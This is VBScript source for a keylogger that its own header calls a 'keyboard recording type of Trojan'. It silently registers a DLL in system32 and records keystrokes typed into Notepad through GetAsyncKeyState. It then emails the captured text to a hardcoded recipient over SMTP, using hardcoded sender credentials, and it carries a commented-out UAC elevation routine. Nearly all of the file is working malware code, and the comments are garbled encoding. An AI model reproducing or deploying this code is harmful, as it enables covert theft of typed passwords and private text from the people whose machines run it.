Option Explicit


'_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/
'_/                                                                                      _/
'_/             This is a simple keyboard recording type of Trojan model                 _/
'_/                                                                                      _/
'_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/





'Call DoUACRunScript()		'�����ű�Ȩ��

'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
'+++ ��ʼ����������:

'**************************************** �������� ****************************************

Const WINDOW_TITLE		= "�ޱ��� - ���±�"		'Ҫ���ӵĳ���Ĵ��ڱ�������
Const PROCESS_NAME		= "notepad.exe"			'Ҫ���ӵĳ���Ľ�������
Const SENDER_MAIL_ADDR	= "fx7ffa4512@163.com"		'���ڷ����ʼ��������ַ
Const SENDER_MAIL_PWD	= "wy20110202"			'���ڷ����ʼ�����������
Const SENDEE_MAIL_ADDR	= "776248550@qq.com"	'���ڽ����ʼ��������ַ

'******************************** ע��Ҫʹ�õ�Win32API���� ********************************

Dim strDllPath
strDllPath = Replace(WScript.ScriptFullName,WScript.ScriptName,"dynwrap.dll")	'��ȡDLL�ļ��ľ���·��
RegisterCOM strDllPath 		'ע��DynamicWrapper���
WScript.Sleep 2000

Dim g_objConnectAPI
Set g_objConnectAPI = CreateObject("DynamicWrapper")	'����ȫ�ֵ�DynamicWrapper�������ʵ��

'����Ϊ������Ҫ�õ���Win32API����
With g_objConnectAPI
	.Register "user32.dll","FindWindow","i=ss","f=s","r=l"
	.Register "user32.dll","GetForegroundWindow","f=s","r=l"
	.Register "user32.dll","GetAsyncKeyState","i=l","f=s","r=l"
End With

'+++
'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



'******************************************************************************************
'*** ����������������:

'ѭ������ָ������
Do
	If IsFoundWindowTitle() And IsTheWindowActive() Then Exit Do	'��ָ�����ڴ�����Ϊ��ǰ���������ѭ��
	WScript.Sleep 500
Loop


Dim TheKeyResult	'���ڱ�����̼�¼�Ľ��
TheKeyResult = ""

'��ʼѭ����¼�����������ڳ��ڷǼ���״̬������û�����س�����ֹͣ��¼����
Do
	If Not IsTheWindowActive() Then Exit Do
	Dim TheKey
	TheKey = ""
	TheKey = GetThePressKey()
	TheKeyResult = TheKeyResult & TheKey
	WScript.Sleep 20
Loop Until TheKey = "[ENTER]"

'MsgBox TheKeyResult,vbSystemModal,"������Ϣ"

SendEmail SENDER_MAIL_ADDR,SENDER_MAIL_PWD,SENDEE_MAIL_ADDR,"","��������",TheKeyResult,""		'���Ͱ�����Ϣ���ʼ�

'CreateLogFile TheKeyResult		'����־��ʽ��������¼�İ�����Ϣ
Dim SP
Set SP=CreateObject("SAPI.SpVoice")
SP.Speak "All Work Down!"
'***
'******************************************************************************************






'------------------------------------------����Ϊ������������-------------------------------------------


'���WINDOW_TITLE��ָ���������ֵĴ����Ƿ����
Function IsFoundWindowTitle()

	Dim hWnd
	hWnd = g_objConnectAPI.FindWindow(vbNullString,WINDOW_TITLE)
	IsFoundWindowTitle = CBool(hWnd)
	
End Function

'���WINDOW_TITLE��ָ���������ֵĴ����Ƿ�Ϊ��ǰ����Ĵ���
Function IsTheWindowActive()

	Dim hWnd,hAct
	hWnd = g_objConnectAPI.FindWindow(vbNullString,WINDOW_TITLE)
	hAct = g_objConnectAPI.GetForegroundWindow()
	IsTheWindowActive = CBool(hWnd=hAct)
	
End Function


'��鵱ǰ�����б����Ƿ����ָ���Ľ���
Function IsExistProcess(strProcessName)

	Dim objWMIService
	Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
	Dim colProcessList
	Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='" & strProcessName & "'")
	IsExistProcess = CBool(colProcessList.Count)

End Function


'�����ʼ�
Function SendEmail(SenderAddress, SenderPassword, SendeeAddress, BackupAddress, MailTitle, MailContent, MailAttachment)
	Const MS_Space = "http://schemas.microsoft.com/cdo/configuration/"	'���ÿռ�
	
	Dim objEmail
	Set objEmail = CreateObject("CDO.Message")
	Dim strSenderID
	strSenderID = Split(SenderAddress,"@",-1,vbTextCompare)
	
	objEmail.From = SenderAddress	'�ļ��˵�ַ
	objEmail.To = SendeeAddress 	'�ռ��˵�ַ
	If BackupAddress <> "" Then
		objEmail.CC = BackupAddress '���õ�ַ
	End If
	objEmail.Subject = MailTitle	'�ʼ�����
	objEmail.TextBody = MailContent '�ʼ�����
	If MailAttachment <> "" Then
		objEmail.AddAttachment MailAttachment	'������ַ
	End If
	
	With objEmail.Configuration.Fields
		
		.Item(MS_Space & "sendusing") = 2							'���Ŷ˿�
		.Item(MS_Space & "smtpserver") = "smtp." & strSenderID(1)	'���ŷ�����
		.Item(MS_Space & "smtpserverport") = 25						'SMTP�������˿�
		.Item(MS_Space & "smtpauthenticate") = 1 					'CDObasec
		.Item(MS_Space & "sendusername") = strSenderID(0)			'�ļ��������˻���
		.Item(MS_Space & "sendpassword") = SenderPassword			'�ʻ�������	
		.Update
		
	End With
	
	objEmail.Send	'�����ʼ�
	
	Set objEmail = Nothing
	SendEmail = True
	
	If Err Then
		Err.Clear
		SendEmail = False
	End If
	
End Function


'������¼��־
Sub CreateLogFile(strLogContent)
	
	Dim objFSO
	Dim objWshShell
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set objWshShell = CreateObject("Wscript.Shell")
	Dim CurrentDirectory
	CurrentDirectory = objWshShell.CurrentDirectory & "\"
	Set objWshShell = Nothing
	
	Dim objLogFile
	Set objLogFile = objFSO.OpenTextFile(CurrentDirectory & "RecordingLog.txt",8,True)
	Set objFSO = Nothing
	objLogFile.WriteLine("��¼ʱ��----> " & Now() & " :")
	objLogFile.WriteLine()
	objLogFile.WriteLine(strLogContent)
	objLogFile.Close
	
End Sub


'ע�����
Sub RegisterCOM(strSource)

	Dim objFSO
	Dim objWshShell
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set objWshShell = CreateObject("Wscript.Shell")
	Dim strSystem32Dir
	strSystem32Dir = objWshShell.ExpandEnvironmentStrings("%WinDir%") & "\system32\"
	
	If objFSO.FileExists(strSystem32Dir & "dynwrap.dll") Then Exit Sub
	objFSO.CopyFile strSource,strSystem32Dir,True
	
	WScript.Sleep 1000
	Dim blnComplete
	blnComplete = False
	Do
		If objFSO.FileExists(strSystem32Dir & "dynwrap.dll") Then
			objWshShell.Run "regsvr32 /s " & strSystem32Dir & "dynwrap.dll"
			blnComplete = True
		End If
	Loop Until blnComplete
	WScript.Sleep 2000		'�ӳ�2���˳�����
End Sub


'��ϵͳΪWin7��Vistaʱ����VBS�ű�Ȩ��
Sub DoUACRunScript()
	
	Dim objOS
	For Each objOS in GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem") 
		If InStr(objOS.Caption,"XP") = 0 Then 
			If WScript.Arguments.length = 0 Then 
				Dim objShell 
				Set objShell = CreateObject("Shell.Application")
				objShell.ShellExecute "wscript.exe", Chr(34) &_
				WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
			End If
		End If
	Next
	
End Sub


'��ȡ�����ϱ����µļ�
Function GetThePressKey()
	
	With g_objConnectAPI
	
	    If .GetAsyncKeyState(13) = -32767 Then
		    GetThePressKey = "[ENTER]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(17) = -32767 Then
		    GetThePressKey = "[CTRL]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(8) = -32767 Then
		    GetThePressKey = "[BACKSPACE]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(9) = -32767 Then
		    GetThePressKey = "[TAB]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(18) = -32767 Then
		    GetThePressKey = "[ALT]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(19) = -32767 Then
		    GetThePressKey = "[PAUSE]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(20) = -32767 Then
		    GetThePressKey = "[CAPS LOCK]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(27) = -32767 Then
		    GetThePressKey = "[ESC]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(33) = -32767 Then
		    GetThePressKey = "[PAGE UP]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(34) = -32767 Then
		    GetThePressKey = "[PAGE DOWN]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(35) = -32767 Then
		    GetThePressKey = "[END]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(36) = -32767 Then
		    GetThePressKey = "[HOME]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(44) = -32767 Then
		    GetThePressKey = "[SYSRQ]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(45) = -32767 Then
		    GetThePressKey = "[INS]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(46) = -32767 Then
		    GetThePressKey = "[DEL]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(144) = -32767 Then
		    GetThePressKey = "[NUM LOCK]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(145) = -32767 Then
		    GetThePressKey = "[SCROLL LOCK]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(37) = -32767 Then
		    GetThePressKey = "[LEFT]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(38) = -32767 Then
		    GetThePressKey = "[UP]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(39) = -32767 Then
		    GetThePressKey = "[RIGHT]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(40) = -32767 Then
		    GetThePressKey = "[DOWN]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(112) = -32767 Then
		    GetThePressKey = "[F1]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(113) = -32767 Then
		    GetThePressKey = "[F2]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(114) = -32767 Then
		    GetThePressKey = "[F3]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(115) = -32767 Then
		    GetThePressKey = "[F4]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(116) = -32767 Then
		    GetThePressKey = "[F5]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(117) = -32767 Then
		    GetThePressKey = "[F6]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(118) = -32767 Then
		    GetThePressKey = "[F7]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(119) = -32767 Then
		    GetThePressKey = "[F8]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(120) = -32767 Then
		    GetThePressKey = "[F9]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(121) = -32767 Then
		    GetThePressKey = "[F10]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(122) = -32767 Then
		    GetThePressKey = "[F11]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(123) = -32767 Then
		    GetThePressKey = "[F12]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(124) = -32767 Then
		    GetThePressKey = "[F13]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(125) = -32767 Then
		    GetThePressKey = "[F14]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(126) = -32767 Then
		    GetThePressKey = "[F15]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(127) = -32767 Then
		    GetThePressKey = "[F16]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(32) = -32767 Then
		    GetThePressKey = "[�ո�]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(186) = -32767 Then
		    GetThePressKey = ";"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(187) = -32767 Then
		    GetThePressKey = "="
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(188) = -32767 Then
		    GetThePressKey = ","
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(189) = -32767 Then
		    GetThePressKey = "-"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(190) = -32767 Then
		    GetThePressKey = "."
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(191) = -32767 Then
		    GetThePressKey = "/"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(192) = -32767 Then
		    GetThePressKey = "`"
		    Exit Function
	    End If
	  
	    '----------NUM PAD----------
	    If .GetAsyncKeyState(96) = -32767 Then
		    GetThePressKey = "0"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(97) = -32767 Then
		    GetThePressKey = "1"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(98) = -32767 Then
		    GetThePressKey = "2"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(99) = -32767 Then
		    GetThePressKey = "3"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(100) = -32767 Then
		    GetThePressKey = "4"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(101) = -32767 Then
		    GetThePressKey = "5"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(102) = -32767 Then
		    GetThePressKey = "6"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(103) = -32767 Then
		    GetThePressKey = "7"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(104) = -32767 Then
	    	GetThePressKey = "8"
	    	Exit Function
	    End If
	  
	    If .GetAsyncKeyState(105) = -32767 Then
		    GetThePressKey = "9"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(106) = -32767 Then
		    GetThePressKey = "*"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(107) = -32767 Then
		    GetThePressKey = "+"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(108) = -32767 Then
		    GetThePressKey = "[ENTER]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(109) = -32767 Then
		    GetThePressKey = "-"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(110) = -32767 Then
		    GetThePressKey = "."
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(&H1) = -32767 Then
		    GetThePressKey = "[������]"
		    Exit Function
	    End If
		
	    If .GetAsyncKeyState(&H4) = -32767 Then
		    GetThePressKey = "[����м�]"
		    Exit Function
	    End If		
		
	    If .GetAsyncKeyState(&H2) = -32767 Then
		    GetThePressKey = "[����Ҽ�]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(220) = -32767 Then
		    GetThePressKey = "\"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(222) = -32767 Then
		    GetThePressKey = "'"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(221) = -32767 Then
		    GetThePressKey = "[�ҷ�����]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(219) = -32767 Then
		    GetThePressKey = "[������]"
		    Exit Function
	    End If
	  	
	    If .GetAsyncKeyState(16) = -32767 Then
		    GetThePressKey = "[SHIFT]"
		    Exit Function
	    End If
	  		  	
	    If .GetAsyncKeyState(65) = -32767 Then
		    GetThePressKey = "A"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(66) = -32767 Then
		    GetThePressKey = "B"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(67) = -32767 Then
		    GetThePressKey = "C"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(68) = -32767 Then
		    GetThePressKey = "D"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(69) = -32767 Then
		    GetThePressKey = "E"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(70) = -32767 Then
		    GetThePressKey = "F"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(71) = -32767 Then
		    GetThePressKey = "G"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(72) = -32767 Then
		    GetThePressKey = "H"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(73) = -32767 Then
		    GetThePressKey = "I"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(74) = -32767 Then
		    GetThePressKey = "J"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(75) = -32767 Then
		    GetThePressKey = "K"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(76) = -32767 Then
		    GetThePressKey = "L"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(77) = -32767 Then
		    GetThePressKey = "M"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(78) = -32767 Then
		    GetThePressKey = "N"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(79) = -32767 Then
		    GetThePressKey = "O"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(80) = -32767 Then
		    GetThePressKey = "P"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(81) = -32767 Then
		    GetThePressKey = "Q"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(82) = -32767 Then
		    GetThePressKey = "R"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(83) = -32767 Then
		    GetThePressKey = "S"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(84) = -32767 Then
		    GetThePressKey = "T"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(85) = -32767 Then
		    GetThePressKey = "U"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(86) = -32767 Then
		    GetThePressKey = "V"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(87) = -32767 Then
		    GetThePressKey = "W"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(88) = -32767 Then
		    GetThePressKey = "X"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(89) = -32767 Then
		    GetThePressKey = "Y"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(90) = -32767 Then
		    GetThePressKey = "Z"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(48) = -32767 Then
		    GetThePressKey = "[0]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(49) = -32767 Then
		    GetThePressKey = "[1]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(50) = -32767 Then
		    GetThePressKey = "[2]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(51) = -32767 Then
		    GetThePressKey = "[3]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(52) = -32767 Then
		    GetThePressKey = "[4]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(53) = -32767 Then
		    GetThePressKey = "[5]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(54) = -32767 Then
		    GetThePressKey = "[6]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(55) = -32767 Then
		    GetThePressKey = "[7]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(56) = -32767 Then
		    GetThePressKey = "[8]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(57) = -32767 Then
		    GetThePressKey = "[9]"
		    Exit Function
	    End If

	End With

End Function
